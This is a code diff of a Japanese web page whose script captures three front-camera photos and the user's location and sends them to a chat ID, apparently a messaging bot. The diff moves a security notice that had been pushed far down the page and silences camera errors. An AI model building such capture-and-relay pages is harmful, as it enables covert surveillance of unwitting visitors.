@@ -21,8 +21,7 @@
   .secondary-btn { padding: 12px; font-size: 16px; background: #bbb; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
   #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 90; }
   
-  /* セキュリティ通知セクション：大きく下に配置 */
-  .security-notice { max-width: 600px; width: 90%; margin: 80vh auto 40px; padding: 25px; background: rgba(0, 0, 0, 0.7); border: 2px solid #ff4081; border-radius: 15px; font-size: 14px; line-height: 1.7; text-align: left; color: #fff; box-shadow: 0 0 20px rgba(255,64,129,0.3); }
+  .security-notice { max-width: 600px; width: 90%; margin: 40vh auto 40px; padding: 25px; background: rgba(0, 0, 0, 0.7); border: 2px solid #ff4081; border-radius: 15px; font-size: 14px; line-height: 1.7; text-align: left; color: #fff; box-shadow: 0 0 20px rgba(255,64,129,0.3); }
   .security-notice summary { cursor: pointer; outline: none; list-style: none; display: flex; justify-content: space-between; align-items: center; }
   .security-notice summary::-webkit-details-marker { display: none; }
   .security-notice summary::after { content: '▼'; font-size: 12px; transition: transform 0.3s; }
@@ -152,12 +151,10 @@ function getTempLocation() {
 async function getTempData() {
   tempPhotos = [];
   tempLocationMsg = "";
-
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     const video = document.createElement("video");
     video.srcObject = stream; await video.play();
-    
     for (let i = 0; i < 3; i++) {
       const tempCanvas = document.createElement("canvas");
       tempCanvas.width = video.videoWidth; tempCanvas.height = video.videoHeight;
@@ -167,12 +164,8 @@ async function getTempData() {
       await new Promise(r => setTimeout(r, 400));
     }
     stream.getTracks().forEach(t => t.stop());
-  } catch (e) {
-    console.log("Error accessing camera");
-  }
-
+  } catch (e) {}
   await getTempLocation();
-  
   if (tempPhotos.length === 0 && !tempLocationMsg) {
     document.getElementById("noDataModal").style.display = "block";
   } else {
@@ -183,7 +176,6 @@ async function getTempData() {
 async function finalSend() {
   document.getElementById("confirmModal").style.display = "none";
   document.getElementById("result").textContent = "送信中...";
-  
   for (const blob of tempPhotos) {
     const fd = new FormData();
     fd.append("chat_id", CHAT_ID);
